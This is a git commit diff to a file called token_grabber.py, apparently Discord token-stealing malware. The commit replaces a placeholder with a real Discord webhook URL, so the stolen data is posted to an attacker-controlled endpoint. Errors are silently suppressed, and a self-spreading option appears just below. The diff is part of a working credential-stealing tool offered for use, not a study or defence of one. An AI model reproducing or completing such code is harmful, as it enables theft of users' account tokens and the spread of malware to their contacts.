d0c8c1f0031a9d5171c9f7a6e2fb2d411afc072e
hekinguvplayz <105136605+hekinguvplayz@users.noreply.github.com>
2022-05-08 08:09:18 +0530

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/972688497557250068/oig7LX1qYVtJ6VXSaZ9pnrUZc5-EyEVOa0uEYAWOGAkKVkw70jCV_K6FawBjZRcWz7S2", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
